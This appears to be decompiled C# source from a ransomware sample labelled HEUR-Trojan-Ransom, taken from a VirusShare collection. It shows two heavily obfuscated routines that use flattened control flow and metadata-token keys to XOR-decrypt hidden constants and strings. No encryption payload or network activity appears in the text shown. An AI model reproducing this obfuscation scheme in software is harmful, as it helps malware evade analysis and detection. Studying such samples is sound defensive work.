// Decompiled with JetBrains decompiler
// Type: ��ϾM�W.�;��
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

internal static class \u0008\uFFFD\uFFFD\u0015ϾM\uFFFDW\u0004\u002E\uFFFD\u003B\uFFFD\uFFFD
{
  static object \uFFFD`\uFFFD\u005EC\uFFFD\u000F\uFFFD\uFFFDfU\uFFFD\u0003\u000E\uFFFDG(
    uint a,
    uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    int num1 = ~(-10 - (4 - 9));
    uint num2;
    while (true)
    {
      uint num3;
      uint num4;
      uint num5;
      uint num6;
      uint num7;
      int num8;
      do
      {
        int num9;
        do
        {
          int num10;
          do
          {
            switch (num1)
            {
              case 1:
                num4 = 614884203U;
                num5 = 911882226U;
                num1 = -~~-11;
                continue;
              case 2:
                num4 ^= (uint) (((int) ((num6 & 16711680U) >> 16) | ~((int) num6 & (int) byte.MaxValue)) * (~(int) num6 & 16711680));
                num1 = ~(~(6 + 8) - -9 - 5);
                continue;
              case 3:
              case 7:
              case 9:
                goto label_13;
              case 4:
                goto label_9;
              case 5:
                goto label_10;
              case 6:
                goto label_11;
              case 8:
                goto label_14;
              case 10:
                goto label_17;
              case 11:
                goto label_18;
              case 12:
                goto label_19;
              case 13:
                goto label_20;
              case 14:
                goto label_21;
              case 15:
                goto label_23;
              case 16:
                goto label_24;
              case 17:
                goto label_25;
              case 18:
                goto label_27;
              case 19:
                goto label_28;
              case 20:
                goto label_29;
              case 21:
                goto label_30;
              case 22:
                goto label_32;
              default:
                if (num3 >= 32U && num3 < 48U)
                {
                  num1 = -(8 + 7 - (18 + -~8));
                  continue;
                }
                if (num3 >= 48U)
                {
                  num10 = (int) num3;
                  num1 = -~8 - 2;
                  continue;
                }
                goto label_13;
            }
          }
          while ((uint) num10 >= 64U);
          num1 = ----2;
          continue;
label_9:
          num6 = 1907690578U ^ (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
          num1 = ~~-1 + 2;
          continue;
label_10:
          num6 |= (uint) ((int) num4 + ~(int) num5 & 812617096);
          num1 = ~~(13 - 6);
          continue;
label_11:
          num9 = (int) num7;
          num1 = ~~16 + 3;
        }
        while ((uint) num9 <= 64U);
        num1 = ~-(~(2 - 7) - -5);
        continue;
label_13:
        ++num7;
        num1 = 9 - (2 + ~-3 + (7 - 8));
        continue;
label_14:
        num2 = num6 ^ b;
        num1 = ~(-31 - (~7 - ~7) - -9);
        continue;
label_15:
        int num11 = (int) num3;
        num1 = ~~-2 + 2;
        if ((uint) num11 >= 16U)
        {
          num1 = -(5 - 6 - -3 - 20) - 4;
          continue;
        }
        continue;
label_17:
        num5 += (num6 ^ num7 - 1U) % num3;
        num1 = -(3 - 24 + 3);
        continue;
label_18:
        num7 = 1U;
        num1 = -~--5;
        continue;
label_19:
        num4 += (uint) (((int) num6 & (int) byte.MaxValue | (int) ((num6 & 16711680U) >> 16)) + (~(int) num6 & (int) byte.MaxValue));
        num1 = -(6 - 6 - (5 + -~7));
        continue;
label_20:
        num5 -= (uint) ~((int) num6 + (int) num3) % 48U;
        num1 = -(~28 - -9);
        continue;
label_21:
        num8 = (int) num3;
        num1 = ~(16 + ~(3 + 2) - (3 + 8));
        continue;
label_25:
        if (num3 >= 16U)
          goto label_15;
        else
          goto label_26;
label_32:
        if (num3 < 0U)
          goto label_15;
        else
          goto label_33;
      }
      while ((uint) num8 >= 32U);
      num1 = ----15;
      continue;
label_23:
      num4 ^= (uint) (((int) num6 & 16711935) << 8 ^ ((int) ((num6 & 16776960U) >> 8) | ~(int) num6 & (int) ushort.MaxValue));
      num5 += num6 * num7 % 32U;
      num1 = -(~-5 + -9);
      continue;
label_24:
      num6 += (uint) (((int) num4 | (int) num5) ^ 812617096);
      num1 = --(16 - ~-8);
      continue;
label_26:
      num4 |= (uint) ((int) ((num6 & 65280U) >> 8) & (int) ((num6 & 16711680U) >> 16) ^ ~(int) num6 & (int) byte.MaxValue);
      num5 ^= (uint) ((int) num6 * (int) num7 + 1) % 16U;
      num1 = 4 - ~~-12;
      continue;
label_27:
      num6 -= (uint) (~((int) num4 ^ (int) num5) + 812617096);
      num1 = ~~(-2 - ~(6 + 2));
      continue;
label_28:
      num6 = (uint) (((int) num6 & 16777215) << 8) | (num6 & 4278190080U) >> 24;
      num3 = (num6 & (uint) byte.MaxValue) % 64U;
      num1 = ~7 - ~34 - 5;
      continue;
label_29:
      num6 ^= num4 % num5 | 812617096U;
      num1 = -~(4 - ~~2);
      continue;
label_33:
      num1 = 15 - ~(9 - 7) - (6 - 5);
    }
label_30:
    object obj;
    if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num2, out obj))
    {
      byte num12;
      byte[] bytes;
      lock (\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ)
      {
        BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
        int num13 = ~~9 - 7;
        while (true)
        {
          switch (num13)
          {
            case 1:
              goto label_37;
            case 2:
              binaryReader.BaseStream.Seek((long) num2, SeekOrigin.Begin);
              num13 = -7 - (2 - 9);
              continue;
            default:
              num12 = binaryReader.ReadByte();
              num13 = ~~(24 - (9 + 7 - ~6));
              continue;
          }
        }
label_37:
        bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
      }
      byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876219 ^ currentMethod.MetadataToken);
      uint num14 = (uint) (((int) num2 + (int) num12) * 1152257809);
      int num15 = -8 - ~18 - 4;
      while (true)
      {
        ushort num16;
        int index;
        ushort num17;
        ushort num18;
        int num19;
        int length;
        do
        {
          ushort num20;
          switch (num15)
          {
            case 1:
              num17 = (ushort) ((num14 * (uint) num17 + (uint) num18) % 65536U);
              num15 = ~~-0;
              continue;
            case 2:
              if (num12 == (byte) 247)
              {
                obj = (object) BitConverter.ToDouble(bytes, 0);
                break;
              }
              goto case 10;
            case 3:
              obj = (object) BitConverter.ToInt64(bytes, 0);
              break;
            case 4:
              num20 = (ushort) (num14 & (uint) ushort.MaxValue);
              num17 = num20;
              num16 = num18;
              index = 0;
              num15 = -~9 - 5;
              continue;
            case 5:
              num15 = ~-~-8;
              continue;
            case 6:
              num19 = index;
              length = bytes.Length;
              num15 = 9 - (13 - 6 + -9);
              continue;
            case 7:
              goto label_54;
            case 8:
              if (num12 != (byte) 4)
              {
                if (num12 == (byte) 95)
                {
                  obj = (object) Encoding.UTF8.GetString(bytes);
                  break;
                }
                break;
              }
              goto label_56;
            case 9:
              goto label_57;
            case 10:
              if (num12 == (byte) 99)
              {
                obj = (object) BitConverter.ToSingle(bytes, 0);
                break;
              }
              if (num12 == (byte) 40)
              {
                obj = (object) BitConverter.ToInt32(bytes, 0);
                break;
              }
              goto case 8;
            case 11:
              goto label_62;
            default:
              num16 = (ushort) ((num14 * (uint) num16 + (uint) num20) % 65536U);
              ++index;
              num15 = ~(2 - -(2 - 2) + ~8);
              continue;
          }
          \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num2] = obj;
          num15 = ~~--9;
        }
        while (num19 < length);
        num15 = 5 + -(9 - 6);
        continue;
label_54:
        num18 = (ushort) (num14 >> 16);
        num15 = ~~(~(9 + 6) - -20);
        continue;
label_56:
        num15 = 6 - (--7 - (2 + 2));
        continue;
label_62:
        bytes[index] ^= (byte) ((num14 * (uint) num17 + (uint) num16) % 256U ^ (uint) numArray[index % 8]);
        num15 = --(7 - 6);
      }
    }
label_57:
    return obj;
  }

  static object H\u0011\u003C\u001B\u007FΞ\u002D\u00097\u0008\uFFFDjK\u002E\uFFFD(uint a, uint b)
  {
    MethodBase currentMethod = MethodBase.GetCurrentMethod();
    uint num1 = (uint) ((ulong) currentMethod.MetadataToken ^ (ulong) currentMethod.DeclaringType.MetadataToken * (ulong) a);
    int num2 = --~-6;
    uint num3;
    Stream 㬓儴ᴟ嚟矶殷ﮊ;
    object obj;
    while (true)
    {
      uint num4;
      int num5;
      do
      {
        uint num6;
        int num7;
        do
        {
          uint num8;
          uint num9;
          uint num10;
          int num11;
          do
          {
            int num12;
            do
            {
              switch (num2)
              {
                case 1:
                case 11:
                  ++num4;
                  goto case 8;
                case 2:
                  if (num6 < 64U)
                  {
                    num9 ^= (uint) (((int) ((num10 & 16711680U) >> 16) | ~((int) num10 & (int) byte.MaxValue)) * (~(int) num10 & 16711680));
                    num2 = 4 - ~~-6;
                    continue;
                  }
                  goto case 1;
                case 3:
                  num10 = (uint) (((int) num10 & 16777215) << 8) | (num10 & 4278190080U) >> 24;
                  num6 = (num10 & (uint) byte.MaxValue) % 64U;
                  if (num6 >= 0U && num6 < 16U)
                  {
                    num9 |= (uint) ((int) ((num10 & 65280U) >> 8) & (int) ((num10 & 16711680U) >> 16) ^ ~(int) num10 & (int) byte.MaxValue);
                    num2 = ~(-18 - (-7 + (5 + 4)) - ~4);
                    continue;
                  }
                  num12 = (int) num6;
                  num2 = 6 - (-9 + 2);
                  continue;
                case 4:
                  num9 += (uint) (((int) num10 & (int) byte.MaxValue | (int) ((num10 & 16711680U) >> 16)) + (~(int) num10 & (int) byte.MaxValue));
                  num2 = 9 - ~(2 + 4 - 7);
                  continue;
                case 5:
                  num10 = 1088978629U ^ num1;
                  num9 = 604607624U;
                  num2 = 5 - (5 + ~2) - 3;
                  continue;
                case 6:
                  num9 ^= (uint) (((int) num10 & 16711935) << 8 ^ ((int) ((num10 & 16776960U) >> 8) | ~(int) num10 & (int) ushort.MaxValue));
                  num2 = ~~--15;
                  continue;
                case 7:
                  num10 -= (uint) (~((int) num9 ^ (int) num8) + 2123251343);
                  goto case 1;
                case 8:
                  if (num4 > 64U)
                  {
                    num3 = num10 ^ b;
                    num2 = -~~-20;
                    continue;
                  }
                  goto case 3;
                case 9:
                  num8 -= (uint) ~((int) num10 + (int) num6) % 48U;
                  num2 = ~(9 + 4) - -41 - (7 + 8);
                  continue;
                case 10:
                  num8 += (num10 ^ num4 - 1U) % num6;
                  num2 = 8 - (-2 - -3);
                  continue;
                case 12:
                  goto label_18;
                case 13:
                  goto label_19;
                case 14:
                  goto label_21;
                case 15:
                  num8 += num10 * num4 % 32U;
                  num10 |= (uint) ((int) num9 + ~(int) num8 & 2123251343);
                  goto case 1;
                case 16:
                  goto label_23;
                case 17:
                  goto label_24;
                case 18:
                  goto label_26;
                case 19:
                  goto label_28;
                case 20:
                  goto label_29;
                case 21:
                  if (num6 < 48U)
                    goto case 1;
                  else
                    goto label_32;
                default:
                  num8 = 2135836757U;
                  num2 = 6 - ~(6 + 6);
                  continue;
              }
            }
            while ((uint) num12 < 16U);
            num2 = ~~(10 - (-3 + ~3));
            continue;
label_18:
            num10 ^= num9 % num8 | 2123251343U;
            num2 = -~2 - 2;
            continue;
label_19:
            num11 = (int) num6;
            num2 = -~25 - 5;
          }
          while ((uint) num11 < 32U);
          num2 = --17 - ~7 - 7;
          continue;
label_21:
          num8 ^= (uint) ((int) num10 * (int) num4 + 1) % 16U;
          num10 += (uint) (((int) num9 | (int) num8) ^ 2123251343);
          num2 = -(~6 - (5 - 1));
          continue;
label_23:
          Monitor.Enter((object) (㬓儴ᴟ嚟矶殷ﮊ = \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ));
          goto label_33;
label_24:
          num7 = (int) num6;
          num2 = ~(~7 - 6);
        }
        while ((uint) num7 >= 32U);
        num2 = 4 + -(2 - 4);
        continue;
label_26:
        num5 = (int) num6;
        num2 = 18 - -~6 - -8 + 2;
      }
      while ((uint) num5 >= 48U);
      num2 = -(-7 - (-8 - -3)) + 2;
      continue;
label_28:
      num4 = 1U;
      num2 = 2 - (-17 + (2 + 9));
      continue;
label_29:
      if (!\u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ.TryGetValue(num3, out obj))
      {
        num2 = -(~8 - (5 + 2));
        continue;
      }
      goto label_57;
label_32:
      num2 = -(~7 - -7 - -5 + ~5);
    }
label_33:
    byte num13;
    byte[] bytes;
    try
    {
      BinaryReader binaryReader = new BinaryReader(\u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ);
      int num14 = --(3 + (9 - 8) - 4);
      while (true)
      {
        switch (num14)
        {
          case 1:
            goto label_37;
          default:
            binaryReader.BaseStream.Seek((long) num3, SeekOrigin.Begin);
            num13 = binaryReader.ReadByte();
            bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num14 = ~-~-3;
            continue;
        }
      }
    }
    finally
    {
      Monitor.Exit((object) 㬓儴ᴟ嚟矶殷ﮊ);
    }
label_37:
    byte[] numArray = Assembly.GetCallingAssembly().GetModule(currentMethod.Module.ScopeName).ResolveSignature(385876218 ^ currentMethod.MetadataToken);
    uint num15 = (uint) (((int) num3 + (int) num13) * 1152257809);
    ushort num16 = (ushort) (num15 >> 16);
    ushort num17 = (ushort) (num15 & (uint) ushort.MaxValue);
    int num18 = 9 + 9 - (33 + (-5 + ~4)) + 5;
    ushort num19;
    ushort num20;
    int index;
    while (true)
    {
      switch (num18)
      {
        case 1:
          if (num13 == (byte) 247)
          {
            obj = (object) BitConverter.ToDouble(bytes, 0);
            num18 = 21 - (-2 - -5) - (8 - 4) - 7;
            continue;
          }
          goto case 10;
        case 2:
          if (num13 == (byte) 95)
          {
            num18 = ~(2 - 4) + 5;
            continue;
          }
          goto case 5;
        case 3:
          obj = (object) BitConverter.ToInt32(bytes, 0);
          goto case 5;
        case 4:
          num20 = num16;
          num18 = -(2 + 2 - ~-17);
          continue;
        case 5:
        case 7:
          \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ[num3] = obj;
          num18 = -~~-11;
          continue;
        case 6:
          obj = (object) Encoding.UTF8.GetString(bytes);
          goto case 5;
        case 8:
        case 9:
          if (index < bytes.Length)
          {
            bytes[index] ^= (byte) ((num15 * (uint) num19 + (uint) num20) % 256U ^ (uint) numArray[index % 8]);
            num18 = 4 + (9 - 4 + (7 - 7)) - (4 - 8);
            continue;
          }
          num18 = 8 + 3 - (8 - 4) - 26 + (9 + 2) + 9;
          continue;
        case 10:
          if (num13 != (byte) 99)
          {
            if (num13 != (byte) 40)
            {
              if (num13 == (byte) 4)
              {
                obj = (object) BitConverter.ToInt64(bytes, 0);
                goto case 5;
              }
              else
                goto case 2;
            }
            else
            {
              num18 = --19 + ~6 - 9;
              continue;
            }
          }
          else
          {
            obj = (object) BitConverter.ToSingle(bytes, 0);
            num18 = ~(-12 - (-2 + (7 - 4))) - 7;
            continue;
          }
        case 11:
          goto label_57;
        case 12:
          index = 0;
          num18 = 31 - --8 + ~9 - 5;
          continue;
        case 13:
          num19 = (ushort) ((num15 * (uint) num19 + (uint) num16) % 65536U);
          num20 = (ushort) ((num15 * (uint) num20 + (uint) num17) % 65536U);
          num18 = -~17 - 4;
          continue;
        case 14:
          ++index;
          num18 = ~-(7 + 6 + (9 - 8) - 4);
          continue;
        default:
          num19 = num17;
          num18 = ~~--4;
          continue;
      }
    }
label_57:
    return obj;
  }
}
